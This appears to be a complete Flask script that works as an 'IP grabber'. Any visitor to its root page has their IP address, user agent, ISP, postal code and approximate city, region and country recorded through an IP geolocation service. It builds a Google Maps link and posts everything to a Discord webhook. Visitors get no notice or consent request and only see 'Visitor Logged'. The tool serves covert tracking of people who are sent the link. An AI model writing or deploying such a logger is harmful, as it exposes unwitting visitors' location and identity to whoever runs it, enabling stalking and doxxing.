from flask import Flask, request
import requests
from datetime import datetime

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://canary.discord.com/api/webhooks/XXXXX/XXXXXXXX"  # replace with your webhook

def get_ip_info(ip):
    try:
        url = f"https://ipapi.co/{ip}/json/"
        response = requests.get(url, timeout=5)
        return response.json()
    except:
        return {}

@app.route('/')
def log_visitor():
    # Get IP
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ',' in ip:
        ip = ip.split(',')[0].strip()

    user_agent = request.headers.get('User-Agent', 'Unknown')
    now = datetime.utcnow().strftime('%d/%m/%Y %H:%M:%S GMT')

    # Get location from ipapi
    data = get_ip_info(ip)
    city = data.get("city", "Unknown")
    region = data.get("region", "Unknown")
    country = data.get("country_name", "Unknown")
    postal = data.get("postal", "Unknown")
    isp = data.get("org", "Unknown")

    google_maps = f"https://www.google.com/maps/search/{city}+{region}+{country}"

    # Message
    message = (
        f"🚶 **New Visitor**\n"
        f"🖥️ IP: `{ip}`\n"
        f"📍 Location: {city}, {region}, {country}\n"
        f"📫 Postal: {postal}\n"
        f"🏢 ISP: {isp}\n"
        f"🌍 Google Maps: {google_maps}\n"
        f"📱 User Agent: {user_agent}\n"
        f"🕒 Time: {now}"
    )

    # Send to Discord
    try:
        requests.post(DISCORD_WEBHOOK_URL, json={"content": message})
    except Exception as e:
        print("Webhook error:", e)

    return "✅ Visitor Logged", 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=10000)
